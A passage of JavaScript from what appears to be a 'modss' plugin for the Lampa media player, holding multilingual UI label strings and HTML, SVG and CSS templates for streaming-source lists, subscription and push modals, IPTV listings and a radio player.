		ro: 'Sezonul 1'
	},
	voice_not_available: {
		ru: 'Недоступен в данной озвучке',
		uk: 'Недоступний у даній озвучці',
		en: 'Not available in this voice',
		be: 'Недаступны ў дадзенай агучцы',
		zh: '该配音不可用',
		bg: 'Не се предлага с този глас',
		cs: 'Není k dispozici v tomto hlasu',
		fr: 'Non disponible dans cette voix',
		he: 'לא זמין בקול הזה',
		pt: 'Não disponível nesta voz',
		ro: 'Nu este disponibil pentru această voce'
	},
	tv_show: {
		ru: 'Тв-Шоу',
		uk: 'ТБ-Шоу',
		en: 'TV Show',
		be: 'ТБ-Шоу',
		zh: '电视节目',
		bg: 'ТВ шоу',
		cs: 'TV show',
		fr: 'Émission de télévision',
		he: 'תוכנית טלוויזיה',
		pt: 'Programa de TV',
		ro: 'Emisiune TV'
	},
	movie_word: {
		ru: 'Фильм',
		uk: 'Фільм',
		en: 'Movie',
		be: 'Фільм',
		zh: '电影',
		bg: 'Филм',
		cs: 'Film',
		fr: 'Film',
		he: 'סֶרֶט',
		pt: 'Filme',
		ro: 'Film'
	},
	serial_word: {
		ru: 'Сериал',
		uk: 'Серіал',
		en: 'Series',
		be: 'Серыял',
		zh: '剧集',
		bg: 'Серия',
		cs: 'Série',
		fr: 'Série',
		he: 'סִדרָה',
		pt: 'Série',
		ro: 'Serie'
	},
	order_standard: {
		ru: 'Стандартно',
		uk: 'Стандартно',
		en: 'Standard',
		be: 'Стандартна',
		zh: '标准',
		bg: 'Стандартен',
		cs: 'Norma',
		fr: 'Standard',
		he: 'תֶקֶן',
		pt: 'Padrão',
		ro: 'Standard'
	},
	order_invert: {
		ru: 'Инвертировать',
		uk: 'Інвертувати',
		en: 'Invert',
		be: 'Інвертаваць',
		zh: '倒序',
		bg: 'Обърнете',
		cs: 'Invertovat',
		fr: 'Inverser',
		he: 'לַהֲפוֹך',
		pt: 'Invertida',
		ro: 'Inversa'
	},
	voice_dubbed: {
		ru: 'Озвучили ',
		uk: 'Озвучили ',
		en: 'Dubbed ',
		be: 'Агучылі ',
		zh: '配音 ',
		bg: 'Дублиран',
		cs: 'Dabované',
		fr: 'Doublée',
		he: 'מדובב',
		pt: 'Dublada',
		ro: 'Dublat'
	},
	episode_prefix: {
		ru: 'Эпизод ',
		uk: 'Епізод ',
		en: 'Episode ',
		be: 'Эпізод ',
		zh: '第 ',
		bg: 'епизод',
		cs: 'Epizoda',
		fr: 'Épisode',
		he: 'אֶפִּיזוֹדָה',
		pt: 'Episódio',
		ro: 'Episod'
	},
	stream_number: {
		ru: 'Поток ',
		uk: 'Потік ',
		en: 'Stream ',
		be: 'Паток ',
		zh: '流 ',
		bg: 'Поток',
		cs: 'Proud',
		fr: 'Flux',
		he: 'זֶרֶם',
		pt: 'Fluxo',
		ro: 'Flux'
	},
	full_soon_available_quality: {
		ru: 'Новинка ещё горячая! <br>Версии в высоком качестве подоспеют чуть позже — немножко терпения.',
		uk: 'Новинка ще гаряча! <br>Версії у високій якості підійдуть трохи пізніше — трішки терпіння.',
		en: 'This release is still hot! <br>High quality versions will arrive a bit later — just a little patience.',
		be: 'Навінка яшчэ гарачая! <br>Версіі ў высокай якасці падыйдуць крыху пазней — трохі цярпення.',
		zh: '新片刚出！<br>高清版本稍后上线，请耐心等待。',
		bg: 'Това издание все още е горещо! <br>Висококачествените версии ще пристигнат малко по-късно — само малко търпение.',
		cs: 'Toto vydání je stále horké! <br>Verze ve vysoké kvalitě dorazí o něco později – jen trochu trpělivosti.',
		fr: 'Cette version est toujours d\'actualité ! <br>Des versions de haute qualité arriveront un peu plus tard — juste un peu de patience.',
		he: 'המהדורה הזו עדיין חמה! <br>גרסאות באיכות גבוהה יגיעו קצת מאוחר יותר - רק קצת סבלנות.',
		pt: 'Este lançamento ainda está quente! <br>Versões de alta qualidade chegarão um pouco mais tarde - basta um pouco de paciência.',
		ro: 'Această versiune este încă fierbinte! <br>Versiunile de înaltă calitate vor ajunge ceva mai târziu — doar puțină răbdare.'
	},
	full_movie_not_released: {
		ru: 'Фильм еще не вышел! <br>Дождитесь официального релиза — скоро появится.',
		uk: 'Фільм ще не вийшов! <br>Дочекайтеся офіційного релізу — скоро з\'явиться.',
		en: 'Movie not released yet! <br>Wait for the official release — coming soon.',
		be: 'Фільм яшчэ не выйшаў! <br>Дачакайцеся афіцыйнага рэлізу — хутка з\'явіцца.',
		zh: '影片尚未上映！<br>请等待正式发行。',
		bg: 'Филмът все още не е пуснат! <br>Изчакайте официалното издание — очаквайте скоро.',
		cs: 'Film ještě nevyšel! <br>Počkejte na oficiální vydání – již brzy.',
		fr: 'Film pas encore sorti ! <br>Attendez la sortie officielle — bientôt disponible.',
		he: 'הסרט עדיין לא יצא לאקרנים! <br>חכו לפרסום הרשמי - בקרוב.',
		pt: 'Filme ainda não lançado! <br>Aguarde o lançamento oficial — em breve.',
		ro: 'Filmul nu a fost lansat încă! <br>Așteptați lansarea oficială — în curând.'
	}
});
		
		
		Lampa.Template.add('onlines_v1', "<div class='online onlines_v1 selector'><div class='online__body'><div style='position: absolute;left: 0;top: -0.3em;width: 2.4em;height: 2.4em'><svg style='height: 2.4em; width:  2.4em;' viewBox='0 0 128 128' fill='none' xmlns='http://www.w3.org/2000/svg'>   <circle cx='64' cy='64' r='56' stroke='white' stroke-width='16'/>   <path d='M90.5 64.3827L50 87.7654L50 41L90.5 64.3827Z' fill='white'/></svg>  </div><div class='online__title' style='padding-left: 2.1em;'>{title}</div><div class='online__quality' style='padding-left: 3.4em;'>{quality}{info}</div> </div></div>");
		Lampa.Template.add('modss_online_css', "<style>.online_modss--full.focus .online_modss__body {background: #b58d362e;}.online_modss--full.focus {-webkit-transform:scale(1.02);-ms-transform: scale(1.02);-o-transform: scale(1.02);transform: scale(1.02);-webkit-transition: -webkit-transform .3s linear 0s;transition: -webkit-transform .3s linear 0s;-o-transition: -o-transform .3s linear 0s;transition: transform .3s linear 0s;transition: transform .3s linear 0s, -webkit-transform .3s linear 0s, -o-transform .3s linear 0s;}@charset 'UTF-8';.full-start-new__buttons .full-start__button.view--modss_online span{display:block;} .online_modss__episode-number-season{font-size:1em;font-weight:700;color:#fff;position:absolute;top:.5em;right:.5em;background-color: rgba(0, 0, 0, 0.4);padding:0.2em;-webkit-border-radius: 0.3em;moz-border-radius: 0.3em;border-radius: 0.3em;} .online_modss__type-video{font-size:1em;font-weight:700;color:#fff;position:absolute;bottom:.5em;right:.5em;background-color: rgba(0, 0, 0, 0.4);padding:0.2em;-webkit-border-radius: 0.3em;moz-border-radius: 0.3em;border-radius: 0.3em;} .online_modss{position:relative;-webkit-border-radius:.3em;-moz-border-radius:.3em;border-radius:.3em;background-color:rgba(0,0,0,0.3);display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex}.online_modss__body{padding:1.2em;line-height:1.3;-webkit-box-flex:1;-webkit-flex-grow:1;-moz-box-flex:1;-ms-flex-positive:1;flex-grow:1;position:relative}@media screen and (max-width:480px){.online_modss__body{padding:.8em 1.2em}}.online_modss__img{position:relative;width:13em;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;min-height:8.2em}.online_modss__img>img{position:absolute;top:0;left:0;width:100%;height:100%;-o-object-fit:cover;object-fit:cover;-webkit-border-radius:.3em;-moz-border-radius:.3em;border-radius:.3em;opacity:0;-webkit-transition:opacity .3s;-o-transition:opacity .3s;-moz-transition:opacity .3s;transition:opacity .3s}.online_modss__img--loaded>img{opacity:1}@media screen and (max-width:480px){.online_modss__img{width:7em;min-height:6em}}.online_modss__folder{padding:1em;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0}.online_modss__folder>svg{width:4.4em!important;height:4.4em!important}.online_modss__viewed{position:absolute;top:1em;left:1em;background:rgba(0,0,0,0.45);-webkit-border-radius:100%;-moz-border-radius:100%;border-radius:100%;padding:.25em;font-size:.76em}.online_modss__subtitle{position:absolute;top: auto !important;bottom:1em;left:1em;background:rgba(0,0,0,0.45);-webkit-border-radius:100%;-moz-border-radius:100%;border-radius:100%;padding:.25em;font-size:.76em}.online_modss__viewed>svg, .online_modss__subtitle>svg{width:1.5em!important;height:1.5em!important;}.online_modss__episode-number{position:absolute;top:0;left:0;right:0;bottom:0;display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-moz-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;-moz-box-pack:center;-ms-flex-pack:center;justify-content:center;font-size:2em}.online_modss__loader{position:absolute;top:50%;left:50%;width:2em;height:2em;margin-left:-1em;margin-top:-1em;background:url(./img/loader.svg) no-repeat center center;-webkit-background-size:contain;-moz-background-size:contain;-o-background-size:contain;background-size:contain}.online_modss__head,.online_modss__footer{display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-webkit-justify-content:space-between;-moz-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between;-webkit-box-align:center;-webkit-align-items:center;-moz-box-align:center;-ms-flex-align:center;align-items:center}.online_modss__timeline{margin:.8em 0}.online_modss__timeline>.time-line{display:block !important}.online_modss__title{font-size:1.7em;overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;display:-webkit-box;-webkit-line-clamp:1;line-clamp:1;-webkit-box-orient:vertical}@media screen and (max-width:480px){.online_modss__title{font-size:1.4em}}.online_modss__time{padding-left:2em}.online_modss__info{display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-moz-box-align:center;-ms-flex-align:center;align-items:center}.online_modss__info>*{overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;display:-webkit-box;-webkit-line-clamp:1;line-clamp:1;-webkit-box-orient:vertical}.online_modss__quality{padding-left:1em;white-space:nowrap}.online_modss__scan-file{position:absolute;bottom:0;left:0;right:0}.online_modss__scan-file .broadcast__scan{margin:0}.online_modss .online_modss-split{font-size:.8em;margin:0 1em;flex-shrink: 0;}.online_modss.focus::after{content:'';position:absolute;top:-0.6em;left:-0.6em;right:-0.6em;bottom:-0.6em;-webkit-border-radius:.7em;-moz-border-radius:.7em;border-radius:.7em;border:solid .3em #fff;z-index:-1;pointer-events:none}.online_modss+.online_modss{margin-top:1.5em}.online_modss--folder .online_modss__footer{margin-top:.8em}.online_modss-rate{display:-webkit-inline-box;display:-webkit-inline-flex;display:-moz-inline-box;display:-ms-inline-flexbox;display:inline-flex;-webkit-box-align:center;-webkit-align-items:center;-moz-box-align:center;-ms-flex-align:center;align-items:center}.online_modss-rate>svg{width:1.3em!important;height:1.3em!important;}.online_modss-rate>span{font-weight:600;font-size:1.1em;padding-left:.7em}.online-empty{line-height:1.4}.online-empty__title{font-size:1.8em;margin-bottom:.3em}.online-empty__time{font-size:1.2em;font-weight:300;margin-bottom:1.6em}.online-empty__buttons{display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex}.online-empty__buttons>*+*{margin-left:1em}.online-empty__button{background:rgba(0,0,0,0.3);font-size:1.2em;padding:.5em 1.2em;-webkit-border-radius:.2em;-moz-border-radius:.2em;border-radius:.2em;margin-bottom:2.4em}.online-empty__button.focus{background:#fff;color:black}.online-empty__templates .online-empty-template:nth-child(2){opacity:.5}.online-empty__templates .online-empty-template:nth-child(3){opacity:.2}.online-empty-template{background-color:rgba(255,255,255,0.3);padding:1em;display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-moz-box-align:center;-ms-flex-align:center;align-items:center;-webkit-border-radius:.3em;-moz-border-radius:.3em;border-radius:.3em}.online-empty-template>*{background:rgba(0,0,0,0.3);-webkit-border-radius:.3em;-moz-border-radius:.3em;border-radius:.3em}.online-empty-template__ico{width:4em;height:4em;margin-right:2.4em}.online-empty-template__body{height:1.7em;width:70%}.online-empty-template+.online-empty-template{margin-top:1em} .online-modss-watched{padding:1em}.online-modss-watched__icon>svg{width:1.5em!important;height:1.5em!important;}.online-modss-watched__body{padding-left:1em;padding-top:.1em;display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap}.online-modss-watched__body>span+span::before{content:' ● ';vertical-align:top;display:inline-block;margin:0 .5em}   </style>");
		Lampa.Template.add('modss_online_full', "<div class=\"online_modss online-prestige online_modss--full selector\"><div class=\"online_modss__img\">    <img alt=\"\">    <div class=\"online_modss__loader\"></div></div><div class=\"online_modss__body\">    <div class=\"online_modss__head\">        <div class=\"online_modss__title\">{title}</div>        <div class=\"online_modss__time\">{serv} {time}</div>    </div><div class=\"online_modss__timeline\"></div><div class=\"online_modss__footer\">        <div class=\"online_modss__info\">{info}</div>        <div class=\"online_modss__quality\">{bitrate}{quality}</div>    </div></div>    </div>");
		Lampa.Template.add('modss_does_not_answer', "<div class=\"online-empty\"><div class=\"online-empty__title\">    {title}</div><div class=\"online-empty__time\">    #{modss_balanser_timeout}</div><div class=\"online-empty__buttons\">    <div class=\"online-empty__button selector cancel\">#{cancel}</div>    <div class=\"online-empty__button selector change\">#{modss_change_balanser}</div></div><div class=\"online-empty__templates\">    <div class=\"online-empty-template\">        <div class=\"online-empty-template__ico\"></div>        <div class=\"online-empty-template__body\"></div>    </div>    <div class=\"online-empty-template\">        <div class=\"online-empty-template__ico\"></div>        <div class=\"online-empty-template__body\"></div>    </div>    <div class=\"online-empty-template\">        <div class=\"online-empty-template__ico\"></div>        <div class=\"online-empty-template__body\"></div>    </div></div>    </div>");
		Lampa.Template.add('modss_online_rate', "<div class=\"online_modss-rate\"><svg width=\"17\" height=\"16\" viewBox=\"0 0 17 16\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">    <path d=\"M8.39409 0.192139L10.99 5.30994L16.7882 6.20387L12.5475 10.4277L13.5819 15.9311L8.39409 13.2425L3.20626 15.9311L4.24065 10.4277L0 6.20387L5.79819 5.30994L8.39409 0.192139Z\" fill=\"#fff\"></path></svg><span>{rate}</span>    </div>");
		Lampa.Template.add('modss_online_folder', "<div class=\"online_modss online_modss--folder selector\"><div class=\"online_modss__folder\">    <svg viewBox=\"0 0 128 112\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">        <rect y=\"20\" width=\"128\" height=\"92\" rx=\"13\" fill=\"white\"></rect>        <path d=\"M29.9963 8H98.0037C96.0446 3.3021 91.4079 0 86 0H42C36.5921 0 31.9555 3.3021 29.9963 8Z\" fill=\"white\" fill-opacity=\"0.23\"></path>        <rect x=\"11\" y=\"8\" width=\"106\" height=\"76\" rx=\"13\" fill=\"white\" fill-opacity=\"0.51\"></rect>    </svg></div><div class=\"online_modss__body\">    <div class=\"online_modss__head\">        <div class=\"online_modss__title\">{title}</div>        <div class=\"online_modss__time\">{time}</div>    </div><div class=\"online_modss__footer\">        <div class=\"online_modss__info\">{info}</div>    </div></div>    </div>");
		Lampa.Template.add('modss_online_watched', "<div class=\"online_modss online-prestige online-modss-watched\"><div class=\"online-modss-watched__icon\">    <svg width=\"21\" height=\"21\" viewBox=\"0 0 21 21\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">        <circle cx=\"10.5\" cy=\"10.5\" r=\"9\" stroke=\"currentColor\" stroke-width=\"3\"/>        <path d=\"M14.8477 10.5628L8.20312 14.399L8.20313 6.72656L14.8477 10.5628Z\" fill=\"currentColor\"/>    </svg></div><div class=\"online-modss-watched__body\">    </div></div>");
		Lampa.Template.add('modss_online_season', "<div class=\"online-modss-watched\" style=\"font-size: 1.5em;font-weight: 300;opacity: 0.5;\">{season}</div>");
		Lampa.Template.add('modss_content_loading', "<div class=\"online-empty\">\n            <div class=\"broadcast__scan\"><div></div></div>\n\t\t\t\n            <div class=\"online-empty__templates\">\n                <div class=\"online-empty-template selector\">\n                    <div class=\"online-empty-template__ico\"></div>\n                    <div class=\"online-empty-template__body\"></div>\n                </div>\n                <div class=\"online-empty-template\">\n                    <div class=\"online-empty-template__ico\"></div>\n                    <div class=\"online-empty-template__body\"></div>\n                </div>\n                <div class=\"online-empty-template\">\n                    <div class=\"online-empty-template__ico\"></div>\n                    <div class=\"online-empty-template__body\"></div>\n                </div>\n            </div>\n        </div>");
		Lampa.Template.add('epg_modss', "<div class=\"notice notice--card selector layer--render image--loaded\"><div class=\"notice__left\"><div class=\"notice__img\"><img/></div></div> <div class=\"notice__body\"> <div class=\"notice__head\"><div class=\"notice__title\">{title}</div><div class=\"notice__time\">{time}</div></div><div class=\"notice__descr\">{descr}</div></div></div>");
		Lampa.Template.add('icon_subs', '<svg width=\"23\" height=\"25\" viewBox=\"0 0 23 25\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M22.4357 20.0861C20.1515 23.0732 16.5508 25 12.5 25C5.59644 25 0 19.4036 0 12.5C0 5.59644 5.59644 0 12.5 0C16.5508 0 20.1515 1.9268 22.4357 4.9139L18.8439 7.84254C17.2872 6.09824 15.0219 5 12.5 5C7.80558 5 5 7.80558 5 12.5C5 17.1944 7.80558 20 12.5 20C15.0219 20 17.2872 18.9018 18.8439 17.1575L22.4357 20.0861Z\" fill=\"currentColor\"/>\n</svg>');
		Lampa.Template.add('modss_voice_limit_modal', '<div style="text-align:center;"><div style="font-size:3em;margin-bottom:0.3em;">⚠️</div><div style="font-size:1.5em;margin-bottom:0.5em;font-weight:600;">#{modss_voice_limit_reached_title}</div><div style="font-size:1.2em;color:rgba(255,255,255,0.6);margin-bottom:1em;">#{modss_voice_limit_reached_message}</div><div style="font-size:2em;margin:0.5em 0;"><b>{current}</b> #{season_from} <b>{max}</b></div><div style="margin-top:1em;color:rgba(255,255,255,0.5);">#{modss_voice_limit_reached_hint}</div></div>');
		Lampa.Template.add('modss_subscriptions_empty', '<div class="modss-subscriptions-empty"><div class="modss-subscriptions-empty__icon">📭</div><div class="modss-subscriptions-empty__text">#{modss_voice_no_subscriptions}</div></div>');
		Lampa.Template.add('modss_socket_push_modal', '<div class="about modssModal">{html}</div>');
		Lampa.Template.add('modss_push_modal_body', '<div class="modss-push-card {cardClass}">{imageWrap}{textWrap}</div>');
		Lampa.Template.add('modss_push_modal_css', '<style id="modss-push-modal-css">.modssModal .modss-push-card{display:flex;flex-direction:row;gap:0.65rem;align-items:flex-start;width:100%;max-width:100%;box-sizing:border-box;margin:0}.modssModal .modss-push-card--image-only,.modssModal .modss-push-card--text-only{flex-direction:column;align-items:center}.modssModal .modss-push-card--text-only{align-items:stretch}.modssModal .modss-push-card__media{flex:0 0 auto;width:min(120px,32vw);min-width:0;max-width:120px;aspect-ratio:2/3;border-radius:8px;overflow:hidden;align-self:flex-start}.modssModal .modss-push-card__media .modss-push-img{width:100%;height:100%;object-fit:cover;display:block;border-radius:8px;vertical-align:top}.modssModal .modss-push-card--image-only .modss-push-card__media{margin:0 auto}.modssModal .modss-push-card__body{flex:1;min-width:0;text-align:left;line-height:1.38;word-wrap:break-word;overflow-wrap:break-word}.modssModal .modss-push-card__desc{font-size:1em;opacity:.95}.modssModal .modss-push-card__desc p{margin:.2em 0}.modssModal .modss-push-card__desc p:first-child{margin-top:0}.modssModal .modss-push-card__desc p:last-child{margin-bottom:0}.modssModal .modss-push-card__desc ol,.modssModal .modss-push-card__desc ul{margin:.25em 0;padding-left:1.15em}.modssModal .modss-push-card__desc li{margin:.1em 0}@media (max-width:620px){.modssModal .modss-push-card--both{flex-direction:row;gap:0.55rem;align-items:flex-start}.modssModal .modss-push-card__media{width:min(100px,30vw);max-width:100px}}</style>');
		Lampa.Template.add('modss_styles', "<style>.rating--modss .rate--cub img {margin-right: 1em!important;}.modss-subscriptions-empty{text-align:center;padding:3em;}.modss-subscriptions-empty__icon{font-size:5em;margin-bottom:0.5em;opacity:0.5;}.modss-subscriptions-empty__text{font-size:1.5em;color:rgba(255,255,255,0.5);}.modss-subscriptions-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:1.5em;}@media screen and (max-width:768px){.modss-subscriptions-grid{grid-template-columns:1fr;}}.card.focus, .card.hover {z-index: 2;-webkit-transform: scale(1.05);-ms-transform: scale(1.05);-o-transform: scale(1.05);transform: scale(1.05);-webkit-transition: -webkit-transform .3s linear 0s;transition: -webkit-transform .3s linear 0s;-o-transition: -o-transform .3s linear 0s;transition: transform .3s linear 0s;transition: transform .3s linear 0s, -webkit-transform .3s linear 0s, -o-transform .3s linear 0s;outline: none;}.mods_iptv__program .notice.focus .notice__descr{display:block}.mods_iptv__program .notice .notice__descr{display:block} .mods_iptv__program .notice:first-child .notice__descr{display:block} .ad-server{display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;-webkit-box-align:start;-webkit-align-items:flex-start;-moz-box-align:start;-ms-flex-align:start;align-items:flex-start;position:relative;background-color:rgba(255,255,255,.1);-webkit-border-radius:.3em;-moz-border-radius:.3em;border-radius:.3em;margin:1.5em 2em}.ad-server__text{padding:1em;-webkit-box-flex:1;-webkit-flex-grow:1;-moz-box-flex:1;-ms-flex-positive:1;flex-grow:1;line-height:1.4}.ad-server__qr{width:8em;height:8em;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0}.ad-server__label{position:absolute;left:0;bottom:0;background-color:#ffe216;-webkit-border-radius:.3em;-moz-border-radius:.3em;border-radius:.3em;padding:.5em;color:#000} .program-body .notice__left{width:15em!important;} .program-body .notice__img{padding-bottom: 57% !important;} @media screen and (max-width:2560px){.epg--img{width:10em;}}@media screen and (max-width:420px){.program-body .notice--card{display:block} .program-body .notice__left{float:left;width:32em!important}.program-body .notice__body{float:left;} .program-body .notice__img{padding-bottom: 56% !important;}} .mods_iptv__program{padding:0 1em}.iptv-list{padding:1.5em;display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-moz-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;-moz-box-pack:center;-ms-flex-pack:center;justify-content:center;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-moz-box-orient:vertical;-moz-box-direction:normal;-ms-flex-direction:column;flex-direction:column;padding-bottom:1em}.iptv-list__ico{width:4.5em;margin-bottom:2em;height:4.5em}.iptv-list__ico>svg{width:4.5em;height:4.5em}.iptv-list__title{font-size:1.9em;margin-bottom:1em}.iptv-list__items{width:80%;margin:0 auto}.iptv-list__items .scroll{height:22em}.iptv-list__item{display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;padding:1em;background-color:rgba(255,255,255,0.1);font-size:1.3em;line-height:1.3;-webkit-border-radius:.3em;-moz-border-radius:.3em;border-radius:.3em;margin:1em}.iptv-list__item-name{width:40%;padding-right:1em;overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;white-space:nowrap;text-align:left}.iptv-list__item-url{width:60%;padding-left:1em;overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;white-space:nowrap;text-align:right}.iptv-list__item.focus{background-color:#fff;color:black} .timeline {position:relative;margin: 0 1em !important;} @media screen and (max-width: 431px) {.card--last_view {right: 0.1em !important;top: 2em !important;} .timeline{bottom: 18em !important}} @media screen and (max-width: 376px) {.timeline{bottom: 13em !important}} @media screen and (max-width: 360px) {.timeline{bottom: 15em !important}}@media screen and (max-width: 344px) {.timeline{bottom: 17em !important}} .card--new_seria {right:2em!important;bottom:10em!important} } #modss--last_s{top:0.6em;right:-.5em;position: absolute;background: #168FDF;color: #fff;padding: 0.4em 0.4em;font-size: 1.2em;-webkit-border-radius: 0.3em;-moz-border-radius: 0.3em;border-radius: 0.3em;} @media screen and (max-width: 450px) { #modss--last_s {right:3em!impotrant}} .card--last_viewD{right:80%!important;top:2em!important}}</style>");
		
		Lampa.Template.add('hdgo_item', '<div class="selector hdgo-item"><div class="hdgo-item__imgbox"><img class="hdgo-item__img"/><div class="card__icons"><div class="card__icons-inner"></div></div></div><div class="hdgo-item__name">{title}</div></div>');
		Lampa.Template.add('hdgo_style', '<style>.last--focus .hdgo-item__imgbox::after {content: "";position: absolute;top: -0.4em;left: -0.4em;right: -0.4em;bottom: -0.4em;border: .3em solid red;-webkit-border-radius: .8em;-moz-border-radius: .8em;border-radius: .8em;opacity: .4}.modss-channel__name {padding:20px;text-align: center;font-size: 1.2em}.forktv.focus .hdgo-item__imgbox::after, .modss__tv.focus .hdgo-item__imgbox::after {opacity: 1}.nuamtv {filter: blur(7px);}.nuamtv:hover, .nuamtv:action {filter: blur(0px);}.a-r.b{color:#fff;background: linear-gradient(to right, rgba(204,0,0,1) 0%,rgba(150,0,0,1) 100%);}.a-r.de{color:#fff;background: linear-gradient(to right, #ffbc54 0%,#ff5b55 100%);}.a-r.g{background: linear-gradient(to right, rgba(205,235,142,1) 0%,rgba(165,201,86,1) 100%);color: #12420D;}.card.home.focus .card__img {border-color: green!important;-webkit-box-shadow: 0 0 0 0.4em green!important;-moz-box-shadow: 0 0 0 0.4em green!important;box-shadow: 0 0 0 0.4em green!important;}@media screen and (max-width: 2560px) {.pc.hdgo.card--collection,.pc.card--collection{width:11em!important} .tv_tv{width:12.5%!important}.tv_tv_c{width:20%!important}.tv_pc{width:16.66%!important}.tv.hdgo.card--collection{width:10.3em!important} .tv.card--collection{width:14.2%!important}.tv.sort.card--collection{width:25%!important}.tv.sort.hdgo.card--collection{width:25%!important}  .sort.hdgo.card--collection .card__view {padding-bottom:25%!important} .tv.two.sort.card--collection .card__view {padding-bottom: 10%!important} .tv.two.sort.card--collection{height:20%!important;width:50%!important}.pc.card--category, .tv.card--category{width:14.28%}.nuam.card--collection{width:20%!important}}   @media screen and (max-width: 1380px) {.pc.card--collection,.forktv .mobile,.mobile_tv{width:16.6%!important} .tv_pc{width:14.28%!important} .tv_pc_c{width:14.28%!important} .tv_tv{width:14.28%!important} .pc.hdgo.card--collection,.hdgo.card--collection{width:10em!important}.sort.pc.card--collection{width:25%!important}.sort.hdgo.card--collection{width:25%!important} .sort.hdgo.card--collection .card__view {padding-bottom:40%!important} .two.sort.card--collection{width:50%!important} .pc.two.sort.card--collection .card__view {padding-bottom: 33%!important} .pc.card--category,.nuam.card--category{width:11.5em!important}}  @media screen and (max-width: 420px) {.pc.card--collection,.forktv .mobile{width:10.3em!important}.mobile_tv{width:33.3%!important}  .pc.hdgo.card--collection,.hdgo.card--collection{width:10em!important}.pc.card--category,.nuam.card--category{width:7.9em!important}.nuam.card--collection{width:33.3%!important}.sort.hdgo.card--collection .card__view {padding-bottom:60%!important}}  .searc.card--collection .card__view {padding-bottom: 5%!important}.searc.card--collection{width:100%!important}.searc.card--collection .card__img{height:100%!important;}.hdgo-item{margin:0 .3em;width:10.4em;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0}.hdgo-item__imgbox{background-color:#3e3e3e;padding-bottom:60%;position:relative;-webkit-border-radius:.3em;-moz-border-radius:.3em;border-radius:.3em}.hdgo-item__img{position:absolute;top:0;left:0;width:100%;height:100%}.hdgo-item__name{font-size:1.1em;margin-top:.8em}.hdgo-item.focus .hdgo-item__imgbox::after{content:"";display:block;position:absolute;left:-.4em;top:-.4em;right:-.4em;bottom:-.4em;-border: .2em solid red;opacity:.6;-webkit-border-radius: .8em;-moz-border-radius: .8em;border-radius: .8em}.hdgo-item +.hdgo-item{margin:0 .3em}.modss_tv .items-line + .items-line, .forktv .items-line + .items-line {margin-top:0!important;}</style>');
		Lampa.Template.add('mods_radio_style', "<style>.blink2{-webkit-animation:blink2 1.5s linear infinite;animation:blink2 1.5s linear infinite}@-webkit-keyframes blink2{100%{color:rgba(34,34,34,0)}}@keyframes blink2{100%{color:rgba(34,34,34,0)}}.controll,.controll *{box-sizing:content-box;letter-spacing:0;}.controll{position:relative;transition:.5s linear;border:.3em solid #fff;background-color:#fff;border-radius:50%;bottom:4.19em;float:right;right:0;padding:1.7em;width:.2em;height:.2em;white-space:nowrap;text-align:center;cursor:pointer}.controll.pause{background-color:#353434;border-color:#3b6531}.controll,.controll .but_left,.controll .but_right,.controll:before{display:inline-block}.controll.pause .but_left,.controll.pause .but_right{margin-left:-8px;margin-top:-8px;border-left:8px solid #fff;border-top:0 solid transparent;border-bottom:0 solid transparent;height:18px}.controll.pause .but_left{border-right:10px solid transparent}.controll.play .but_right{margin-left:-5px;margin-top:-9px;border-left:15px solid #525252;border-top:10px solid transparent;border-bottom:10px solid transparent}.controll:hover,.controll.focus{background-color:#fff}.controll.play.focus{border-color:#8a8a8a}.controll.focus .but_left,.controll.focus .but_right,.controll:hover .but_left,.controll:hover .but_right{border-left-color:#252525}.Radio_n .card__view {padding-bottom: 75%!important;}.stbut,.stbut *{box-sizing:content-box;letter-spacing:0}.title_plaing{position:absolute;text-align:center;width:15em;margin-top:-1.2em;font-size:1.1em}.stbut{transition:.5s linear;border:.15em solid #fbfbfb;background-color:#000;border-radius:4em;margin-top:1em;padding:0.3em 4em 0em 0.5em;font-size:2em;cursor:pointer;height:1.5em;max-width:4em}.stbut:hover, .stbut.focus{background-color:#edebef;color:#616060;border-color:#8e8e8e}</style>");
		Lampa.Template.add('info_radio', '<div style="height:8em" class="radio_r info layer--width"><div class="info__left"><div style="margin-top:25px" class="info__title"></div><div class="info__create"></div></div><div style="display:block" class="info__right"> <b class="title_plaing"></b>   <div id="stantion_filtr"><div id="stbut" class="stbut selector"><b>СТАНЦИИ</b></div></div>    <div id="player_radio"><div id="plbut" class="controll selector play"><span class="but_left"></span><span class="but_right"></span></div></div></div></div>');
